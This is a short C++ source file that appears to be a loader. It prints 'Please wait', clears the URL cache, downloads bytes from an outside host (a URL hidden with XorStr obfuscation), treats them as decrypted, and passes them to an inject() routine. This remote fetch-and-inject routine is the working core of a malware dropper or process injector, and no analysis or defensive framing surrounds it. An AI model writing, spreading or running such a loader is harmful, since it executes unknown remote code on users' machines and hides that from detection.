#include "../Includes/Common/Xor.h"


#include <iostream>
#include "Injection.h"
#include "Encryption.h"

#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winInet.lib")
	
#define URL XorStr("http://api.isolation.top/builds/client/output.txt")


int main()
{
	std::cout << XorStr("Please wait\n");
	DeleteUrlCacheEntry(URL);
	std::vector < BYTE > decrypted = downl(URL);
	inject(decrypted);

}

